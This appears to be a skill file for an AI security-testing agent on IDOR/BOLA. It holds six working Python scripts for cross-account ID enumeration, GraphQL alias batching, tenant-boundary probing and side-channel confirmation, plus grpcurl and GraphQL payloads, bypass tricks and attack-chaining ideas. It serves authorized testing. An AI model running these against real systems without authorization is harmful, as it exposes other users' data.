<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: idor
description: IDOR/BOLA testing for object-level authorization failures and cross-account data access, with automated enumeration scripts and multi-principal validation
---

# IDOR / BOLA

Object-level authorization failures (BOLA/IDOR) lead to cross-account data exposure and unauthorized state changes across APIs, web, mobile, and microservices. Treat every object reference as untrusted until proven bound to the caller.

## Attack Surface

**Scope**
- Horizontal access: access another subject's objects of the same type
- Vertical access: access privileged objects/actions (admin-only, staff-only)
- Cross-tenant access: break isolation boundaries in multi-tenant systems
- Cross-service access: token or context accepted by the wrong service

**Reference Locations**
- Paths, query params, JSON bodies, form-data, headers, cookies
- JWT claims, GraphQL arguments, WebSocket messages, gRPC messages

**Identifier Forms**
- Integers, UUID/ULID/CUID, Snowflake, slugs
- Composite keys (e.g., `{orgId}:{userId}`)
- Opaque tokens, base64/hex-encoded blobs

**Relationship References**
- parentId, ownerId, accountId, tenantId, organization, teamId, projectId, subscriptionId

**Expansion/Projection Knobs**
- `fields`, `include`, `expand`, `projection`, `with`, `select`, `populate`
- Often bypass authorization in resolvers or serializers

## High-Value Targets

- Exports/backups/reporting endpoints (CSV/PDF/ZIP)
- Messaging/mailbox/notifications, audit logs, activity feeds
- Billing: invoices, payment methods, transactions, credits
- Healthcare/education records, HR documents, PII/PHI/PCI
- Admin/staff tools, impersonation/session management
- File/object storage keys (S3/GCS signed URLs, share links)
- Background jobs: import/export job IDs, task results
- Multi-tenant resources: organizations, workspaces, projects

---

## Automated Enumeration Scripts

### Script 1 — Sequential ID Enumerator (REST)

Tests a range of integer IDs against an endpoint with two principals. Detects when principal B can access resources belonging to principal A.

```python
#!/usr/bin/env python3
"""
IDOR sequential enumerator.
Usage: python3 idor_enum.py --url https://api.target.com/users/ID/profile \
       --token-a "Bearer <victim_token>" \
       --token-b "Bearer <attacker_token>" \
       --range 1 200
"""
import argparse, ssl, json, sys, time
from urllib.request import urlopen, Request
from urllib.error import HTTPError, URLError

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def probe(url, token):
    try:
        req = Request(url, headers={"Authorization": token, "Accept": "application/json"})
        resp = urlopen(req, context=ctx, timeout=10)
        body = resp.read()
        return resp.status, len(body), body[:300].decode(errors='replace')
    except HTTPError as e:
        body = e.read()[:100].decode(errors='replace')
        return e.code, 0, body
    except URLError as e:
        return 0, 0, str(e)

parser = argparse.ArgumentParser()
parser.add_argument("--url", required=True, help="URL with 'ID' placeholder")
parser.add_argument("--token-a", required=True, help="Owner token (victim)")
parser.add_argument("--token-b", required=True, help="Attacker token")
parser.add_argument("--range", nargs=2, type=int, default=[1, 50])
parser.add_argument("--delay", type=float, default=0.1)
args = parser.parse_args()

print(f"[*] Testing IDs {args.range[0]}-{args.range[1]}")
print(f"[*] URL template: {args.url}")
print()

findings = []
for i in range(args.range[0], args.range[1] + 1):
    url = args.url.replace("ID", str(i))

    status_a, len_a, body_a = probe(url, args.token_a)
    status_b, len_b, body_b = probe(url, args.token_b)

    # IDOR if: owner gets 200, attacker also gets 200 with real content
    if status_a == 200 and status_b == 200 and len_b > 50:
        print(f"[IDOR] ID={i} | Owner: {status_a} ({len_a}B) | Attacker: {status_b} ({len_b}B)")
        print(f"  Attacker response preview: {body_b[:150]}")
        findings.append({"id": i, "url": url})
    elif status_a == 200 and status_b in (403, 401):
        pass  # Correct — attacker denied
    elif status_a == 200 and status_b == 200 and len_b < 50:
        pass  # Likely empty/stub
    else:
        pass  # Owner also 404/403 — resource doesn't exist

    time.sleep(args.delay)

print(f"\n[*] IDOR candidates found: {len(findings)}")
for f in findings:
    print(f"  {f['url']}")
```

---

### Script 2 — Multi-Principal Matrix Tester

Tests a set of endpoints with multiple token/role combinations. Detects authorization inconsistencies across the full action matrix.

```python
#!/usr/bin/env python3
"""
Multi-principal IDOR matrix tester.
Reads config from idor_config.json (see format below).
"""
import json, ssl, argparse, sys
from urllib.request import urlopen, Request
from urllib.error import HTTPError

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Config format (idor_config.json):
# {
#   "principals": {
#     "owner":   "Bearer eyJ...",
#     "other":   "Bearer eyJ...",
#     "admin":   "Bearer eyJ..."
#   },
#   "tests": [
#     {
#       "name": "Get invoice",
#       "method": "GET",
#       "url": "https://api.target.com/invoices/OWNER_INVOICE_ID",
#       "expected": {"owner": 200, "other": 403, "admin": 200}
#     },
#     {
#       "name": "Export profile CSV",
#       "method": "GET",
#       "url": "https://api.target.com/users/OWNER_USER_ID/export.csv",
#       "expected": {"owner": 200, "other": 403, "admin": 200}
#     }
#   ]
# }

def do_request(method, url, token, body=None):
    headers = {"Authorization": token, "Accept": "application/json"}
    if body:
        headers["Content-Type"] = "application/json"
    req = Request(url, method=method,
                  data=json.dumps(body).encode() if body else None,
                  headers=headers)
    try:
        resp = urlopen(req, context=ctx, timeout=12)
        return resp.status, len(resp.read())
    except HTTPError as e:
        return e.code, 0

parser = argparse.ArgumentParser()
parser.add_argument("-c", "--config", default="idor_config.json")
args = parser.parse_args()

with open(args.config) as f:
    cfg = json.load(f)

principals = cfg["principals"]
tests = cfg["tests"]
failures = []

for test in tests:
    print(f"\n[TEST] {test['name']}")
    print(f"  {test['method']} {test['url']}")
    for pname, token in principals.items():
        status, size = do_request(test["method"], test["url"], token, test.get("body"))
        expected = test.get("expected", {}).get(pname)
        ok = (expected is None) or (status == expected)
        flag = "✓" if ok else "✗ IDOR"
        print(f"  [{flag}] {pname}: HTTP {status} ({size}B) [expected {expected}]")
        if not ok and status == 200:
            failures.append({"test": test["name"], "principal": pname, "url": test["url"], "status": status})

print(f"\n{'='*60}")
print(f"IDOR FAILURES: {len(failures)}")
for f in failures:
    print(f"  [{f['principal']}] {f['test']} -> HTTP {f['status']} | {f['url']}")
```

---

### Script 3 — UUID Harvester (Extract IDs from Live Responses)

Collects UUIDs and integer IDs from API responses, building a corpus for cross-principal testing.

```python
#!/usr/bin/env python3
"""
Harvest object IDs from a set of API endpoints (list/search/export).
Builds a reusable ID corpus for IDOR testing.

Usage: python3 uuid_harvest.py --token "Bearer <token>" \
       --endpoints endpoints.txt
"""
import re, json, ssl, argparse
from urllib.request import urlopen, Request
from urllib.error import HTTPError

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

UUID_RE = re.compile(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', re.I)
INT_ID_RE = re.compile(r'"(?:id|userId|accountId|invoiceId|orderId|projectId|tenantId|orgId)"\s*:\s*(\d+)')
SLUG_RE = re.compile(r'"(?:slug|handle|username|identifier)"\s*:\s*"([^"]{3,64})"')

parser = argparse.ArgumentParser()
parser.add_argument("--token", required=True)
parser.add_argument("--endpoints", required=True)
parser.add_argument("--out", default="id_corpus.json")
args = parser.parse_args()

corpus = {"uuids": set(), "integers": set(), "slugs": set()}

endpoints = [l.strip() for l in open(args.endpoints) if l.strip()]
for url in endpoints:
    try:
        req = Request(url, headers={
            "Authorization": args.token,
            "Accept": "application/json"
        })
        resp = urlopen(req, context=ctx, timeout=15)
        body = resp.read().decode(errors='replace')
        corpus["uuids"].update(UUID_RE.findall(body))
        corpus["integers"].update(INT_ID_RE.findall(body))
        corpus["slugs"].update(SLUG_RE.findall(body))
        print(f"[+] {url} -> {len(UUID_RE.findall(body))} UUIDs, {len(INT_ID_RE.findall(body))} IDs")
    except Exception as e:
        print(f"[-] {url}: {e}")

out = {k: sorted(v) for k, v in corpus.items()}
with open(args.out, "w") as f:
    json.dump(out, f, indent=2)

print(f"\n[*] Corpus saved to {args.out}")
print(f"    UUIDs: {len(out['uuids'])}")
print(f"    Integer IDs: {len(out['integers'])}")
print(f"    Slugs: {len(out['slugs'])}")
```

---

### Script 4 — Blind IDOR Confirmer (Timing + Size + ETag Differential)

When responses are identical regardless of content (e.g., always `{"status":"ok"}`), use side-channel differentials to confirm IDOR.

```python
#!/usr/bin/env python3
"""
Blind IDOR confirmation via timing, response size, and ETag differentials.
Use when content is masked but side channels still leak existence/ownership.

Usage: python3 blind_idor.py \
       --url "https://api.target.com/messages/ID" \
       --token-a "Bearer <victim>" --token-b "Bearer <attacker>" \
       --ids 1001,1002,1003,1004,1005
"""
import ssl, time, argparse
from urllib.request import urlopen, Request
from urllib.error import HTTPError

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def probe_timing(url, token, repeats=3):
    """Returns avg response time, body size, status, etag."""
    times, size, status, etag = [], 0, 0, None
    for _ in range(repeats):
        t0 = time.perf_counter()
        try:
            req = Request(url, headers={"Authorization": token, "Accept": "application/json"})
            resp = urlopen(req, context=ctx, timeout=15)
            body = resp.read()
            status = resp.status
            size = len(body)
            etag = resp.headers.get("ETag", "")
        except HTTPError as e:
            status = e.code
            size = 0
            etag = ""
        times.append(time.perf_counter() - t0)
        time.sleep(0.05)
    return status, size, etag, sum(times) / len(times)

parser = argparse.ArgumentParser()
parser.add_argument("--url", required=True)
parser.add_argument("--token-a", required=True)
parser.add_argument("--token-b", required=True)
parser.add_argument("--ids", required=True, help="comma-separated IDs to test")
args = parser.parse_args()

ids = [i.strip() for i in args.ids.split(",")]
print(f"{'ID':>8} | {'Status-A':>8} | {'Status-B':>8} | {'Size-A':>8} | {'Size-B':>8} | {'ETag-A':>12} | {'ETag-B':>12} | Finding")
print("-" * 100)

for id_ in ids:
    url = args.url.replace("ID", id_)
    sa, sza, eta, ta = probe_timing(url, args.token_a)
    sb, szb, etb, tb = probe_timing(url, args.token_b)

    # Detection logic
    finding = ""
    if sa == 200 and sb == 200:
        if eta and etb and eta == etb:
            finding = "IDOR (same ETag)"
        elif sza == szb and sza > 100:
            finding = "IDOR (same size)"
        elif sza > 0 and szb > 0:
            finding = "POSSIBLE IDOR"
    elif sa == 200 and sb == 404 and ta > tb + 0.05:
        finding = "Exists (timing leak) - different principals"
    elif sa == 200 and sb == 403:
        finding = "Correctly denied"

    print(f"{id_:>8} | {sa:>8} | {sb:>8} | {sza:>8} | {szb:>8} | {eta[:12]:>12} | {etb[:12]:>12} | {finding}")
```

---

### Script 5 — GraphQL Alias IDOR Batcher

Tests BOLA via GraphQL by requesting multiple users' data in a single aliased query, then comparing results.

```python
#!/usr/bin/env python3
"""
GraphQL IDOR via alias batching.
Requests objects belonging to different users in one query.
Detects when attacker's token gets data for other users.

Usage: python3 graphql_idor.py \
       --url https://api.target.com/graphql \
       --token-attacker "Bearer <attacker>" \
       --victim-ids "abc123,def456,ghi789" \
       --query-template queries/user_profile.graphql
"""
import json, ssl, argparse, re
from urllib.request import urlopen, Request
from urllib.error import HTTPError

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Default query template — override with --query-template
DEFAULT_QUERY_TEMPLATE = """
query IDORTest {
  ALIAS: user(id: "TARGET_ID") {
    id
    email
    name
    role
    createdAt
  }
}
"""

def gql(url, token, query):
    payload = json.dumps({"query": query}).encode()
    req = Request(url, data=payload, headers={
        "Authorization": token,
        "Content-Type": "application/json",
        "Accept": "application/json"
    })
    try:
        resp = urlopen(req, context=ctx, timeout=15)
        return resp.status, json.loads(resp.read())
    except HTTPError as e:
        return e.code, {}

parser = argparse.ArgumentParser()
parser.add_argument("--url", required=True)
parser.add_argument("--token-attacker", required=True)
parser.add_argument("--victim-ids", required=True)
parser.add_argument("--query-template", default=None)
args = parser.parse_args()

victim_ids = [i.strip() for i in args.victim_ids.split(",")]

template = DEFAULT_QUERY_TEMPLATE
if args.query_template:
    with open(args.query_template) as f:
        template = f.read()

# Build a batched query with one alias per victim ID
aliases = []
for i, vid in enumerate(victim_ids):
    q = template.replace("ALIAS", f"victim_{i}").replace("TARGET_ID", vid)
    # Strip 'query IDORTest {' wrapper to allow batching
    inner = re.sub(r'^\s*query\s+\w+\s*\{', '', q).rsplit('}', 1)[0]
    aliases.append(inner)

combined_query = "query IDORBatch {\n" + "\n".join(aliases) + "\n}"
print(f"[*] Sending batched query for {len(victim_ids)} IDs via attacker token")

status, body = gql(args.url, args.token_attacker, combined_query)
print(f"[*] HTTP {status}")

data = body.get("data", {})
errors = body.get("errors", [])

if errors:
    print(f"[!] Errors: {json.dumps(errors, indent=2)}")

for i, vid in enumerate(victim_ids):
    alias_key = f"victim_{i}"
    result = data.get(alias_key)
    if result:
        print(f"\n[IDOR] Victim ID={vid} data accessible via attacker token:")
        for k, v in result.items():
            print(f"  {k}: {v}")
    else:
        print(f"[OK] Victim ID={vid}: null/denied")
```

---

### Script 6 — Multi-Tenant Boundary Tester

Tests whether org/tenant context can be escaped by switching IDs in headers, paths, and body params.

```python
#!/usr/bin/env python3
"""
Multi-tenant IDOR boundary tester.
Tests if attacker in Org B can access resources belonging to Org A.

Usage: python3 tenant_idor.py \
       --base-url https://api.target.com \
       --token-org-a "Bearer <org_a_token>" \
       --token-org-b "Bearer <org_b_token>" \
       --org-a-id "org_111" --org-b-id "org_222"
"""
import json, ssl, argparse
from urllib.request import urlopen, Request
from urllib.error import HTTPError

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

TENANT_VECTORS = [
    # (description, url_template, extra_headers)
    ("Path param", "/orgs/ORG_A_ID/members", {}),
    ("Path param — nested", "/orgs/ORG_A_ID/projects", {}),
    ("X-Organization-ID header", "/members", {"X-Organization-ID": "ORG_A_ID"}),
    ("X-Tenant-ID header", "/members", {"X-Tenant-ID": "ORG_A_ID"}),
    ("X-Account-ID header", "/members", {"X-Account-ID": "ORG_A_ID"}),
    ("org query param", "/members?org=ORG_A_ID", {}),
    ("organizationId query param", "/members?organizationId=ORG_A_ID", {}),
    ("Reports rollup", "/orgs/ORG_A_ID/reports/summary", {}),
    ("Billing", "/orgs/ORG_A_ID/billing/invoices", {}),
    ("Export", "/orgs/ORG_A_ID/export.csv", {}),
]

parser = argparse.ArgumentParser()
parser.add_argument("--base-url", required=True)
parser.add_argument("--token-org-a", required=True, help="Victim org token")
parser.add_argument("--token-org-b", required=True, help="Attacker org token")
parser.add_argument("--org-a-id", required=True)
parser.add_argument("--org-b-id", required=True)
args = parser.parse_args()

def probe(url, token, extra_headers=None):
    headers = {"Authorization": token, "Accept": "application/json"}
    if extra_headers:
        headers.update(extra_headers)
    try:
        req = Request(url, headers=headers)
        resp = urlopen(req, context=ctx, timeout=10)
        body = resp.read()
        return resp.status, len(body), body[:200].decode(errors='replace')
    except HTTPError as e:
        return e.code, 0, ""

print(f"\n{'Vector':<35} | {'Org-A (Owner)':>13} | {'Org-B (Attacker)':>16} | Finding")
print("-" * 90)

for desc, path_template, extra_hdrs in TENANT_VECTORS:
    path = path_template.replace("ORG_A_ID", args.org_a_id).replace("ORG_B_ID", args.org_b_id)
    url = args.base_url.rstrip("/") + path

    # Substitute org IDs into extra headers
    resolved_hdrs = {k: v.replace("ORG_A_ID", args.org_a_id) for k, v in extra_hdrs.items()}

    sa, sza, ba = probe(url, args.token_org_a, resolved_hdrs)
    sb, szb, bb = probe(url, args.token_org_b, resolved_hdrs)

    finding = ""
    if sa == 200 and sb == 200 and szb > 50:
        finding = "TENANT IDOR"
    elif sa == 200 and sb in (403, 401):
        finding = "Correctly denied"
    elif sa in (404, 403):
        finding = "Endpoint N/A"

    print(f"{desc:<35} | {str(sa)+' ('+str(sza)+'B)':>13} | {str(sb)+' ('+str(szb)+'B)':>16} | {finding}")
```

---

## Key Vulnerability Patterns

### Horizontal & Vertical Access

- Swap object IDs between principals using the same token to probe horizontal access
- Repeat with lower-privilege tokens to probe vertical access
- Target partial updates (PATCH, JSON Patch/JSON Merge Patch) for silent unauthorized modifications

### Bulk & Batch Operations

- Batch endpoints (bulk update/delete) often validate only the first element; include cross-tenant IDs mid-array
- CSV/JSON imports referencing foreign object IDs (ownerId, orgId) may bypass create-time checks

### Secondary IDOR

- Use list/search endpoints, notifications, emails, webhooks, and client logs to collect valid IDs
- Fetch or mutate those objects directly
- Pagination/cursor manipulation to skip filters and pull other users' pages

### Job/Task Objects

- Access job/task IDs from one user to retrieve results for another (`export/{jobId}/download`, `reports/{taskId}`)
- Cancel/approve someone else's jobs by referencing their task IDs

### File/Object Storage

- Direct object paths or weakly scoped signed URLs
- Attempt key prefix changes, content-disposition tricks, or stale signatures reused across tenants
- Replace share tokens with tokens from other tenants; try case/URL-encoding variations

### GraphQL

- Enforce resolver-level checks: do not rely on a top-level gate
- Verify field and edge resolvers bind the resource to the caller on every hop
- Abuse batching/aliases to retrieve multiple users' nodes in one request
- Global node patterns (Relay): decode base64 IDs and swap raw IDs

```graphql
query IDOR {
  me { id }
  u1: user(id: "VXNlcjo0NTY=") { email billing { last4 } }
  u2: node(id: "VXNlcjo0NTc=") { ... on User { email } }
}
```

### Microservices & Gateways

- Token confusion: token scoped for Service A accepted by Service B due to shared JWT verification but missing audience/claims checks
- Trust on headers: reverse proxies or API gateways injecting/trusting headers like `X-User-Id`, `X-Organization-Id`; try overriding or removing them
- Context loss: async consumers (queues, workers) re-process requests without re-checking authorization

### Multi-Tenant

- Probe tenant scoping through headers, subdomains, and path params (`X-Tenant-ID`, org slug)
- Try mixing org of token with resource from another org
- Test cross-tenant reports/analytics rollups and admin views which aggregate multiple tenants

### gRPC

- Direct protobuf fields (`owner_id`, `tenant_id`) often bypass HTTP-layer middleware
- Validate references via grpcurl with tokens from different principals

```bash
# gRPC IDOR test — swap user_id in request
grpcurl -H "Authorization: Bearer ATTACKER_TOKEN" \
  -d '{"user_id": "VICTIM_USER_ID"}' \
  api.target.com:443 user.UserService/GetProfile
```

---

## Bypass Techniques

**Parser & Transport**
- Content-type switching: `application/json` ↔ `application/x-www-form-urlencoded` ↔ `multipart/form-data`
- Method tunneling: `X-HTTP-Method-Override`, `_method=PATCH`; or using GET on endpoints incorrectly accepting state changes
- JSON duplicate keys/array injection to bypass naive validators

**Parameter Pollution**
- Duplicate parameters in query/body to influence server-side precedence (`id=123&id=456`); try both orderings
- Mix case/alias param names so gateway and backend disagree (userId vs userid)

**Cache & Gateway**
- CDN/proxy key confusion: responses keyed without Authorization or tenant headers expose cached objects to other users
- Manipulate Vary and Accept headers
- Redirect chains and 304/206 behaviors can leak content across tenants

**Race Windows**
- Time-of-check vs time-of-use: change the referenced ID between validation and execution using parallel requests

**Blind Channels**
- Use differential responses (status, size, ETag, timing) to detect existence
- Error shape often differs for owned vs foreign objects
- HEAD/OPTIONS, conditional requests (`If-None-Match`/`If-Modified-Since`) can confirm existence without full content

---

## IDOR Testing Workflow (End-to-End)

```
Step 1: ID Collection
  → Run uuid_harvest.py against list/search/export endpoints with OWNER token
  → Collect UUIDs, integers, slugs into id_corpus.json

Step 2: Sequential Enumeration
  → Run idor_enum.py with VICTIM token + ATTACKER token
  → Flag any IDs where both tokens return HTTP 200 with non-trivial content

Step 3: Batch Testing
  → Run graphql_idor.py (for GraphQL targets) with victim_ids from corpus
  → Look for aliased responses returning data from other principals

Step 4: Tenant Boundary
  → Run tenant_idor.py with two different org tokens
  → Test all header/path/param vectors for cross-tenant access

Step 5: Blind Confirmation
  → Run blind_idor.py on IDs where content is masked
  → Use ETag/size/timing differentials to prove access exists

Step 6: State Change Proof
  → PATCH/PUT/DELETE a victim's resource using attacker token
  → Confirm change persisted via GET with victim token
```

---

## Validation Requirements

1. Demonstrate access to an object not owned by the caller (content or metadata)
2. Show the same request fails with appropriately enforced authorization when corrected
3. Prove cross-channel consistency: same unauthorized access via at least two transports (e.g., REST and GraphQL)
4. Document tenant boundary violations (if applicable)
5. Provide reproducible steps and evidence (requests/responses for owner vs non-owner)

**Minimum proof set:**
```
Request 1 (owner): GET /resource/ID → HTTP 200 + content
Request 2 (attacker, different account): GET /resource/ID → HTTP 200 + same content
Request 3 (confirm it should be denied): GET /resource/ID without auth → HTTP 401/403
```

## Chaining Attacks

- IDOR + CSRF: force victims to trigger unauthorized changes on objects you discovered
- IDOR + Stored XSS: pivot into other users' sessions through data you gained access to
- IDOR + SSRF: exfiltrate internal IDs, then access their corresponding resources
- IDOR + Race: bypass spot checks with simultaneous requests
- IDOR + Mass Assignment: discover a writable ownerId field, then use IDOR ID to point it at victim

## False Positives

- Public/anonymous resources by design
- Soft-privatized data where content is already public
- Idempotent metadata lookups that do not reveal sensitive content
- Correct row-level checks enforced across all channels

## Impact

- Cross-account data exposure (PII/PHI/PCI) — CVSS 7.5-9.1
- Unauthorized state changes (transfers, role changes, cancellations)
- Cross-tenant data leaks violating contractual and regulatory boundaries
- Regulatory risk (GDPR/HIPAA/PCI), fraud, reputational damage

## Pro Tips

1. Always test list/search/export endpoints first; they are rich ID seeders
2. Build a reusable ID corpus from logs, notifications, emails, and client bundles
3. Toggle content-types and transports; authorization middleware often differs per stack
4. In GraphQL, validate at resolver boundaries; never trust parent auth to cover children
5. In multi-tenant apps, vary org headers, subdomains, and path params independently
6. Check batch/bulk operations and background job endpoints; they frequently skip per-item checks
7. Inspect gateways for header trust and cache key configuration
8. Treat UUIDs as untrusted; obtain them via OSINT/leaks and test binding
9. Use timing/size/ETag differentials for blind confirmation when content is masked
10. Prove impact with precise before/after diffs and role-separated evidence
